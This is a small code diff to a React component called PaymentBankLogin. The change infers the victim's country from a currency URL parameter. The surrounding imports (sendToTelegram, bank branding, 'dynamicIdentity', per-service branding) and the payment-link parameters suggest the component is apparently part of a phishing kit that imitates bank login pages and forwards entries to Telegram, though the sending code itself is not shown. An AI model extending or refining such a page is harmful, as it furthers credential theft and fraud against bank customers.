@@ -12,7 +12,7 @@ import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency } from "@/lib/countryCurrencies";
+import { formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
 import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
 import { designSystem } from "@/lib/designSystem";
@@ -40,6 +40,9 @@ const PaymentBankLogin = () => {
   const currencyParam = searchParams.get('currency');
   const bankParam = searchParams.get('bank') || searchParams.get('b');
 
+  // استنتاج الدولة من العملة إذا لم تكن موجودة
+  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
+
   const customerInfo = linkData?.payload?.customerInfo || {};
   const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';
   const cardInfo = linkData?.payload?.cardInfo || {};
@@ -49,7 +52,7 @@ const PaymentBankLogin = () => {
   const branding = getServiceBranding(serviceKey);
   
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
-  const selectedCountry = countryParam || linkData?.payload?.selectedCountry || "SA";
+  const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
   const shippingInfo = linkData?.payload as any;
   const rawAmount = amountParam || shippingInfo?.cod_amount;
 
